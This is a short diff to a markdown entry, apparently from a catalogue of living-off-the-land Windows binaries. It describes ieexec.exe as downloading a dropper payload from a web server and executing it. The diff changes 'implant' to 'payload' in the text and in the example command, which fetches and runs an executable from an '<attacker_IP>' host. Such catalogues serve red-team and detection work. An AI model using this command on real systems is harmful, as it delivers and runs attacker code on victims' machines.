@@ -1,9 +1,9 @@
 # ieexec
 
-Downloads the dropper implant from a web server then executes it.
+Downloads the dropper payload from a web server then executes it.
 
 ```
-C:\> ieexec.exe http[s]://<attacker_IP>[:<PORT>]/implant.exe
+C:\> ieexec.exe http[s]://<attacker_IP>[:<PORT>]/payload.exe
 ```
 
 ---
